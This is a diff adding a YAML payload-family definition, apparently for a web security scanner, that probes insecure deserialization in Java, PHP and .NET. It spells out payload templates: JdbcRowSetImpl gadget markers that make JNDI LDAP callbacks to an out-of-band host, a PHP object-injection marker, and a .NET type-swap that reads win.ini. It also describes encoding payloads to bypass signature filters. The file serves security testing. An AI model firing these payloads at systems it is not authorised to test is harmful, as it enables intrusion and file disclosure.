@@ -1,0 +1,43 @@
+family_id: deserialization
+description: >-
+  Java/PHP/.NET deserialization probes for insecure unmarshalling sinks
+  (CWE-502). Seeds carry gadget chain markers for Jackson, XStream, and
+  PHP unserialize without executing live exploit chains.
+cwe_ids: [502]
+owasp_top10:
+  - 'A08:2021'
+risk_level: high
+requires_approval: false
+oast_required: true
+payloads:
+  - id: jackson_marker
+    template: '["com.sun.rowset.JdbcRowSetImpl",{{"dataSourceName":"ldap://{oast_host}/{canary}"}}]'
+    confidence: suspected
+    notes: Jackson polymorphic deserialization gadget chain marker with OAST callback.
+  - id: xstream_marker
+    template: '<java.util.PriorityQueue serialization="custom"><unserializable-parents/><java.util.PriorityQueue><default><size>2</size><comparator class="com.sun.rowset.JdbcRowSetImpl"><dataSourceName>ldap://{oast_host}/{canary}</dataSourceName></comparator></default></java.util.PriorityQueue></java.util.PriorityQueue>'
+    confidence: suspected
+    notes: XStream XML deserialization probe referencing JNDI-safe LDAP callback.
+  - id: php_unserialize_marker
+    template: 'O:8:"stdClass":1:{{s:4:"exec";s:5:"id";}}'
+    confidence: suspected
+    notes: PHP unserialize object injection probe with safe command marker.
+  - id: dotnet_typeswap
+    template: '{{"$type":"System.IO.FileInfo, mscorlib","data":"C:\\WINDOWS\\win.ini"}}'
+    confidence: suspected
+    notes: .NET TypeNameHandling deserialization type-swap probe for file disclosure.
+mutations:
+  - name: encoding_wrappers
+    description: Wrap gadget markers in base64 or hex to bypass signature filters.
+  - name: gadget_swap
+    description: Rotate through CommonsCollections / Spring / Groovy gadget signatures.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw deserialization payload body.
+  - name: base64_only
+    stages: [base64]
+    description: Base64-encoded; common for serialization transport formats.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded for form-embedded deserialization payloads.
